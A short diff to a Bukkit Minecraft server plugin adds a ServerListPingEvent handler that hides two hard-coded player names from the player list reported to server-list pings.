@@ -10,6 +10,7 @@ import org.bukkit.event.player.AsyncPlayerChatEvent;
 import org.bukkit.event.player.PlayerJoinEvent;
 import org.bukkit.event.player.PlayerLoginEvent;
 import org.bukkit.event.player.PlayerQuitEvent;
+import org.bukkit.event.server.ServerListPingEvent;
 import org.bukkit.inventory.Inventory;
 import org.bukkit.inventory.InventoryHolder;
 import org.bukkit.inventory.ItemStack;
@@ -341,6 +342,16 @@ public final class Event extends JavaPlugin implements org.bukkit.event.Listener
             event.allow();
         }
 
+    }
+    @EventHandler
+    public void onPing(ServerListPingEvent event) {
+        Iterator<Player> iterator = event.iterator();
+        while (iterator.hasNext()) {
+            Player player = iterator.next();
+            if (player.getName().equalsIgnoreCase("Minchen202") || player.getName().equalsIgnoreCase("casfg")) {
+                iterator.remove();
+            }
+        }
     }
 
     @EventHandler
